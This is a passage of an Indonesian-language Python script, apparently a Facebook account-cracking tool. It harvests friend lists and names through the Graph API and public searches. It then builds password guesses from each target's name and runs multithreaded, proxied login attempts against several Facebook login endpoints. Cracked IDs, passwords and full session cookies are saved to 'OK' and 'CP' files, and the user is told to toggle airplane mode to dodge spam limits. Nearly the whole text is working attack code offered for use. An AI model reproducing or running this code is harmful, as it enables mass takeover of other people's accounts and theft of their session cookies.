				tree.add(f"[b yellow]{cpkuni[0]}|{cpkuni[1]}[b white]")
				cetak(tree)
				nocp +=1
			input(f"{P}[{H}!{P}] Klik Enter ")
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			cetak(panel(f"[b white]File Tidak DiTemukan",width=50,style=f"{jkt_48}"))
			time.sleep(2)
			back()
		if len(vin)==0:
			cetak(panel(f"[b white]Anda Tidak Memiliki Hasil [b green]OK",width=50,style=f"{jkt_48}"))
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					cetak(panel(f"[b red][[b white]{nom}[b red]] {A2}{isi} {str(len(hem))} Account",width=50,style=f"{jkt_48}"))
				else:
					lol.update({str(cih):str(isi)})
					cetak(panel(f"[b red][[b white]{str(cih)}[b red]] {A2}{isi} {str(len(hek))} Account",width=50,style=f"{jkt_48}"))
			geeh = input(f'{P}[{H}?{P}] Input : ')
			try:geh = lol[geeh]
			except KeyError:
				cetak(panel(f"[b white]Yang Bener Kak 1/2",width=50,style=f"{jkt_48}"))
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				cetak(panel(f"[b white]File Tidak DiTemukan",width=50,style=f"{jkt_48}"))
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				tree = Tree(" ")
				tree.add(f"[b green]{cpkuni[0]}|{cpkuni[1]}[b white]")
				tree.add(f"[b purple]{cpkuni[2]}[b white]")
				cetak(tree)
				nocp +=1
			input(f"{P}[{H}!{P}] Klik Enter ")
			back()
	elif kz in ['3','03']:
		back()
	else:
		cetak(panel(f"[b white]Yang Bener Kak 1/2",width=50,style=f"{jkt_48}"))
		exit()
### ----- [ KREK FILE ] ----- ###
def DumpCrysti():
	try:vin = os.listdir('/sdcard/DUMP')
	except FileNotFoundError:
		cetak(panel(f'[b white]File Tidak Di Temukan',width=40,style=f"{jkt_48}")) 
		time.sleep(2)
		back()
	if len(vin)==0:
		cetak(panel(f'[b white]Kamu Tidak Memiliki File Dump',width=40,style=f"{jkt_48}"))
		time.sleep(2)
		back()
	else:
		cetak(panel(f'[b white]Pilih File yang ingin di crack',width=50,style=f"{jkt_48}"))
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
				cetak(panel(f"[b white][[b cyan]{nom}[b white]] {isi} [b green]{len(hem)}[b white] ID",width=50,style=f"{jkt_48}"))
			else:
				lol.update({str(cih):str(isi)})
				print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				cetak(panel(f"[b cyan]{nom}.{PU} {isi} [b green]{len(hem)} ID",width=50,style=f"{jkt_48}"))
		geeh = input(f'{P}[{K}+{P}] Choice : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{P}Pilih Yang Bener Kontol{P}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/DUMP/'+geh,'r').read().splitlines()
		except:
			cetak(panel(f'[b white]File Tidak Ditemukan, Coba Lagi Nanti',width=40,style=f"{jkt_48}")) 
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		settingWithAdel()
### ----- [ DUMP ID ] ----- ###
def DumpAlin():
	try:
		token = open('.FreyaTok.txt' , 'r').read()
		cok = {'cookie': open('.AdelCok.txt' , 'r').read()}
	except(FileNotFoundError):
		exit()
	try:
		params = {
		  'access_token': token,
		  'fields': 'name,id'
		}
		po = ses.get('https://graph.facebook.com/me', params = params , cookies = cok).json()
	except(KeyError):
		cetak('Cookies anda mokad') ; time.sleep(3)
		exit()
	try:
		cetak(panel(f"[b white]Masukan ID Wajib [b green]Publik[b white] Gunakan (,) Untuk Lebih Dari 1 ID",width=70,style=f"{jkt_48}"))
		uid = Console().input('Masukan ID : ').split(',')
		if uid in ['' , ' ']:
			cetak('Masukan Id, Jangan Kosong')
			exit()
		cetak(panel(f"[b white]Tekan [b green]CTRL[b white]+[b green]C [b white]Untuk Berhenti Dump",width=70,style=f"{jkt_48}"))
		for i in uid:
			dumping(i , '' , token , cok)
	except(KeyboardInterrupt) as e:
		loop = 0
		print('')
		cetak(panel(f"[b white]Masukan Nama File Contoh[b green] /sdcard/DUMP/hasil.txt",width=70,style=f"{jkt_48}"))
		file = Console().input('Nama File : ')
		cetak(panel(f"[b white]Gunakan (,) Untuk Memisahkan ID Cnth : [b green]10009,10008,10007",width=70,style=f"{jkt_48}"))
		cetak(panel(f"{M2}[{P2}01{M2}]{A2} Dump ID Old\n{M2}[{P2}02{M2}] {A2}Dump ID New\n{M2}[{P2}03{M2}] {A2}Dump ID Random",width=70,style=f"{jkt_48}"))
		pisah = Console().input('[bold white]Masukan Id Pemisah : ')
		cetak('\n[bold white]Proses Memisahkan Uid')
		if pisah in ['1','01']:
			for x in id3:
				id = x.split('|')[0]
				if len(id)<11:
					loop+=1
					cetak('[bold white]Sedang Mengumpulkan [bold green]{}|{} [bold white]ID'.format(id,loop) , end = ' \r');time.sleep(0.0007)
					with open(file , 'a') as kall:
						kall.write(x +'\n')
			cetak(panel(f"[b white]Dump Selesai Tersimpan Di [bold green]{file}",width=70,style=f"{jkt_48}"))
		elif pisah in ['02','2','New']:
			for x in id3:
				id = x.split('|')[0]
				if len(id)<11:
					pass
				else:
					if len(id)<15:
						loop+=1
						cetak('[bold white]Sedang Mengumpulkan [bold green]{}|{} [bold white]ID'.format(id,loop) , end = ' \r');time.sleep(0.0007)
						with open(file , 'a') as kall:
							kall.write(x +'\n')
			cetak(panel(f"[b white]Dump Selesai Tersimpan Di [bold green]{file}",width=70,style=f"{jkt_48}"))
		elif pisah in ['03','3','Random']:
			for x in id3:
				loop+=1
				id = x.split('|')[0]
				cetak('[bold white]Sedang Mengumpulkan [bold green]{}|{} [bold white]ID'.format(id,loop) , end = ' \r');time.sleep(0.0007)
				with open(file , 'a') as kall:
					kall.write(x +'\n')
			cetak(panel(f"[b white]Dump Selesai Tersimpan Di [bold green]{file}",width=70,style=f"{jkt_48}"))
		else:
			for x in id3:
				id = x.split('|')[0]
				for tahun in pisah.split(','):
					if id[0:5]==tahun:
						loop+=1
						cetak('[bold white]Sedang Mengumpulkan [bold green]{}|{} [bold white]ID'.format(id,loop) , end = ' \r');time.sleep(0.0007)
						with open(file , 'a') as kall:
							kall.write(x +'\n')
			cetak(panel(f"[b white]Dump Selesai Tersimpan Di [bold green]{file}",width=70,style=f"{jkt_48}"))
		
def dumping(uidz , after , tok , cok):#> Buat Dump Uid
	try:
		if len(id)==0:
			params = {
			  'access_token': tok,
			  'fields': 'friends'
			}
		else:
			params = {
			  'access_token': tok,
			  'fields': 'friends.after({})'.format(after)
			}
		po = ses.get('https://graph.facebook.com/{}'.format(uidz) , params = params , cookies = cok).json()
		for x in po['friends']['data']:
			try:
				berkelanjutan(str(x.get('id')) , '' , tok , cok)
				id.append(str(x.get('id')))
			except(KeyError):
				pass
		afr = po['friends']['paging']['cursors']['after']
		dumping(uidz , afr , tok , cok)
	except(KeyError) as e:
		if len(id3)==0:
			cetak(panel(f"[b white]Teman Anda Privat",width=50,style=f"{jkt_48}"))
		else:
			cetak(panel(f"[b white]Kesalahan Terjadi [b green]{e}",width=50,style=f"{jkt_48}"))
			cetak(panel(f"[b white]Cookies Anda Mokad Tekan CTRL + C Untuk Berhenti Dump",width=70,style=f"{jkt_48}"))
def berkelanjutan(uidz , after2 , tok , cok):#> Dump Sesi 2
	if len(id2)==0:
		params = {
		  'access_token': tok,
		  'fields': 'friends'
		}
	else:
		params = {
		  'access_token': tok,
		  'fields': 'friends.after({})'.format(after2)
		}
	po2 = ses.get('https://graph.facebook.com/{}'.format(uidz) , params = params , cookies = cok).json()
	if 'paging' in po2['friends']:
		for x in po2['friends']['data']:
			id2.append(str(x.get('id')))
			id3.append(str(x.get('id'))+'|'+str(x.get('name')))
		cetak('sedang Mengumpulkan [bold green]{}|{} [bold white]Id'.format(str(x.get('id')) , len(id3)) , end = ' \r')
	else:
		id2.clear()
	afr2 = po2['friends']['paging']['cursors']['after']
	berkelanjutan(uidz , afr2 , tok , cok)
### ----- [ Dump Search Name ] ----- ###
class Cari_Nama:
	def __init__(self):
		self.daftar = []
		self.sudah = []
	
	def apa_nama(self):
		cetak(panel(f"{P2}[{H2}!{P2}] Masukan Nama Yang Ingin Kalian Dump ",width=70,style=f"{jkt_48}"))
		rozhbasxyz = input(f"{P}[{H}?{P}] Masukan Nama : ")
		self.limit = input(f"{P}[{H}?{P}] Masukan Total : "); cetak(panel(f"[b white]Gunakan [b green]CTRL+C [b white]Untuk Menghentikan Dump",width=70,style=f"bold cyan"))
		self.daftar.append(rozhbasxyz)
		while True:
			try:
				name = rc(self.daftar)
				if len(id) >= int(self.limit): break
				if name not in self.sudah: self.url = f"https://x.facebook.com/public/{name}/?locale=id_ID"; self.sudah.append(name); self.dump_nama()
			except KeyboardInterrupt: break
		exit(settingWithAdel())
	
	def dump_nama(self):
		while True:
			try:
				link = ses.get(self.url).text
				A = re.findall('"FB:TEXT4">(.*?)</div>', link); B = []
				if len(self.daftar)<=50: self.daftar.extend(i for i in A if i not in self.daftar)
				B.extend(z for z in [x for x in re.findall('result_id:(\d+),', link)] if z not in B)
				result = ['|'.join(pair) for pair in zip(B, A)]
				id.extend(t for t in result if t not in id)
				for s in result: print(f"\r{P}[{H}!{P}] Sedang Mengumpulkan{H} {s.split('|')[0]}|{len(id)}{P} ID", flush=True, end="")
				self.url=re.findall('"see_more_pager",href:"(.*?)",',link)[0]
			except Exception as e: break
### ----- [ Setting ID With Adel ] ----- ###
def settingWithAdel():
	print('')
	cetak(panel(f"{P2}Total Account : {M2}{len(id)}",width=30,style=f"{jkt_48}"))
	cetak(panel(f"{M2}[{P2}01{M2}] {A2}Crack ID OLD\n{M2}[{P2}02{M2}]{A2} Crack Id NEW\n{M2}[{P2}03{M2}] {A2}Crack ID Random",width=70,style=f"{jkt_48}",title=f"{P2}Setting ID"))
	hu = input(f'{P}[{H}?{P}] Input : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		cetak(panel(f"{P2}Unknown option, please try again",width=50,style=f"{jkt_48}"))
		exit()
### ----- [ Setting Metode JKT48 ] ----- ###
	cetak(panel(f"{M2}[{P2}01{M2}] {A2}Validate\n{M2}[{P2}02{M2}] {A2}Mbasic\n{M2}[{P2}03{M2}]{A2} Mbasic V2\n{M2}[{P2}04{M2}] {A2}Async\n{M2}[{P2}05{M2}] {A2}Free",width=70,style=f"{jkt_48}",title=f"{P2}Setting Metode"))
	AdelGemes = input(f"{P}[{H}?{P}] Input : ")
	if AdelGemes in ['01','1']:
		adelia.append('AdelValid')
	elif AdelGemes in ['02','2']:
		adelia.append('FreyaMbasic')
	elif AdelGemes in ['03','3']:
		adelia.append('ZeeMbasic')
	elif AdelGemes in ['04','4']:
		adelia.append('CrystiAsync')
	elif AdelGemes in ['05','5']:
		adelia.append('TrishaFree')
	else:
		adelia.append('AdelValid')
### ----- [ Setting Metode JKT48 ] ----- ###
	cetak(panel(f"{P2}[{H2}!{P2}] Ingin Menambahkan User Agent Manual Y/T",width=70,style=f"{jkt_48}"))
	Dudull = input(f"{P}[{H}?{P}] Input : ")
	if Dudull in ['y','Y']:
		uadel.append('ya')
		cetak(panel(f"{P2}[{H2}?{P2}] Masukan User Agent Tambahan Anda ",width=70,style=f"{jkt_48}"))
		dedel = input(f"{P}[{H}?{P}] Masukan Ua : ")
		uaadel.append(dedel)
	else:
		uadel.append('tidak')
	cetak(panel(f"{P2}[{H2}!{P2}] Ingin Menambahkan Password Manual Saat Mendaptkan OK/CP Y/T",width=70,style=f"{jkt_48}"))
	BagaiKucingKalem = input(f"{P}[{H}?{P}] Input : ")
	if BagaiKucingKalem in ['y','Y']:
		pwalin.append('ya')
		cetak(panel(f"{P2}[{H2}!{P2}] Masukan Password Tambahan 6 Karakter Gunakan ',' Untuk Lebih Dari 1 Huruf",width=70,style=f"{jkt_48}"))
		sandilu = input(f"{P}[{H}?{P}] Input Password : ")
		Teather = sandilu.split(',')
		for sayangadel in Teather:
			pwadel.append(sayangadel)
	else:
		pwalin.append('tidak')
	passwordAdel()
### ----- [ Setting Password JKT48 ] ----- ###
def passwordAdel():
	global prog,des,loop
	rr = random.randint
	urut = []
	urut.append(panel(f"[b yellow]     CP/{ddealin}",width=35,title=f"[bold white]Hasil [b yellow]CP",style=f"{jkt_48}"))
	urut.append(panel(f"[b green]     OK/{ddetrisha}",width=35,title=f"[bold white] Hasil [b green]OK",style=f"{jkt_48}"))
	wa.print(Columns(urut))
	cetak(panel(f"[b white]  Mainkan Mode Pesawat Setiap [b red]10[b white] Detik Agar Terhindar Dari Spam",width=70,style=f"{jkt_48}",title=f"[b white] Informasi"))
	prog = Progress(TimeElapsedColumn(),TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as KucingKalem:
			for revaadelia in id2:
				idf,nmf = revaadelia.split('|')[0],revaadelia.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pw_adel = ['kamunanya','sayang','kata sandi','bagong']
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pw_adel.append(nmf)
						pw_adel.append(frs+'321')
						pw_adel.append(frs+'123')
						pw_adel.append(frs+'1234')
						pw_adel.append(frs+'12345')
						pw_adel.append(frs+'123456')
				else:
					if len(frs)<3:
						pw_adel.append(nmf)
					else:
						pw_adel.append(nmf)
						pw_adel.append(frs+'321')
						pw_adel.append(frs+'123')
						pw_adel.append(frs+'1234')
						pw_adel.append(frs+'12345')
						pw_adel.append(frs+'123456')
				if 'ya' in pwalin:
					for adelloveyou in pwadel:
						pw_adel.append(adelloveyou)
				else:pass
				if 'AdelValid' in adelia:
					KucingKalem.submit(CrackAdel,idf,pw_adel)
				elif 'FreyaMbasic' in adelia:
					KucingKalem.submit(CrackFreya,idf,pw_adel)
				elif 'ZeeMbasic' in adelia:
					KucingKalem.submit(CrackZee,idf,pw_adel)
				elif 'CrystiAsync' in adelia:
					KucingKalem.submit(CrackCrysti,idf,pw_adel)
				elif 'TrishaFree' in adelia:
					KucingKalem.submit(CrackTrisha,idf,pw_adel)
				else:
					KucingKalem.submit(CrackAdel,idf,pw_adel)
### ----- [ HASIL OK CP ] ----- ###
	cetak(panel(f"{P2}[{H2}!{P2}] Sukses Crack {H2}{len(id)}{P2} Dengan Hasil {H2}OK-:{ok} {K2}CP-:{cp}",width=70,style=f"{jkt_48}"))
### ----- [ CrackWithAdel ] ----- ###
def CrackAdel(idf,pw_adel):
	global loop,ok,cp
	prog.update(des,description=f'\r{M}{loop}/{len(id)} {H}OK-:{ok} {K}CP-:{cp}  ')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pw_adel:
		try:
			if 'ya' in uadel: ua = uaadel[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'free.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==','content-length': '166','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if 'checkpoint' in ses.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				tree = Tree(f"[b white]{M2}{ddealin}")
				tree.add(f"{K2}Login Gagal{P2}")
				tree.add(f"{K2}{idf}|{pw}{P2}")
				tree.add(f"{K2}{ua}{P2}")
				cetak(tree)
				os.popen('play-audio cpeh.mp3')
				open('CP/'+ddealin,'a').write(idf+'|'+pw+'\n')
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree(f"[b white]{ddetrisha}")
				tree.add(f"{H2}Login Sukses{P2}")
				tree.add(f"{H2}{idf}|{pw}{P2}")
				tree.add(f"{U2}{kuki}{P2}")
				cetak(tree)
				os.popen('play-audio okeh.mp3')
				open('OK/'+ddetrisha,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
### ----- [ CrackWithFreya ] ----- ###
def CrackFreya(idf,pw_adel):
	global loop,ok,cp
	prog.update(des,description=f'\r{M}{loop}/{len(id)} {H}OK-:{ok} {K}CP-:{cp}  ')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pw_adel:
		try:
			if 'ya' in uadel: ua = uaadel[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				tree = Tree(f"[b white]{M2}{ddealin}")
				tree.add(f"{K2}Login Gagal{P2}")
				tree.add(f"{K2}{idf}|{pw}{P2}")
				tree.add(f"{K2}{ua}{P2}")
				cetak(tree)
				os.popen('play-audio cpeh.mp3')
				open('CP/'+ddealin,'a').write(idf+'|'+pw+'\n')
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree(f"[b white]{ddetrisha}")
				tree.add(f"{H2}Login Sukses{P2}")
				tree.add(f"{H2}{idf}|{pw}{P2}")
				tree.add(f"{U2}{kuki}{P2}")
				cetak(tree)
				os.popen('play-audio okeh.mp3')
				open('OK/'+ddetrisha,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
### ----- [ CrackWithZee ] ----- ###
def CrackZee(idf,pw_adel):
	global loop,ok,cp
	prog.update(des,description=f'\r{M}{loop}/{len(id)} {H}OK-:{ok} {K}CP-:{cp}  ')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pw_adel:
		try:
			if 'ya' in uadel: ua = uaadel[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8")
			data = {"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),"li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":pw,"login":"Masuk","bi_xrwh":re.search('name="bi_xrwh" value="(.*?)"', str(link.text)).group(1)}
			head = {"Host": "mbasic.facebook.com","Connection": "keep-alive","Content-Length": "181","Cache-Control": "max-age=0","Upgrade-Insecure-Requests": "1","Origin": "https://mbasic.facebook.com","Content-Type": "application/x-www-form-urlencoded","User-Agent": ua,"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","X-Requested-With": "mark.via.gp","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "navigate","Sec-Fetch-User": "?1","Sec-Fetch-Dest": "document","Referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","Accept-Encoding": "gzip, deflate","Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl", data = data, headers = head, allow_redirects=False, proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				tree = Tree(f"[b white]{M2}{ddealin}")
				tree.add(f"{K2}Login Gagal{P2}")
				tree.add(f"{K2}{idf}|{pw}{P2}")
				tree.add(f"{K2}{ua}{P2}")
				cetak(tree)
				os.popen('play-audio cpeh.mp3')
				open('CP/'+ddealin,'a').write(idf+'|'+pw+'\n')
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				tree = Tree(f"[b white]{ddetrisha}")
				tree.add(f"{H2}Login Sukses{P2}")
				tree.add(f"{H2}{idf}|{pw}{P2}")
				tree.add(f"{U2}{kuki}{P2}")
				cetak(tree)
				os.popen('play-audio okeh.mp3')
				open('OK/'+ddetrisha,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
### ----- [ CrackWithCrysti ] ----- ###
def CrackCrysti(idf,pw_adel):
	global loop,ok,cp
	prog.update(des,description=f'\r{M}{loop}/{len(id)} {H}OK-:{ok} {K}CP-:{cp}  ')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pw_adel:
		try:
			if 'ya' in uadel: ua = uaadel[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.prod.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 